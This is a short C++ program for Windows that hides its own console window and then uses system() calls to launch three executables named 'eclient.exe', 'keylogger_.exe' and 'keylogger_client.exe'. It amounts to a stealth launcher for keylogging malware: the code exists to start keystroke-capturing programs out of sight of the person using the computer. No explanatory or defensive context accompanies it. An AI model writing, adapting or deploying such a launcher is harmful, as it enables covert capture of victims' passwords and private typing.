
#include <iostream>
#include <windows.h>
using namespace std;
void openint() {
	system("eclient.exe");system("keylogger_.exe");system("keylogger_client.exe");
}
int main() {
	HWND windowed;
	windowed = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(windowed, 0);
	openint();
}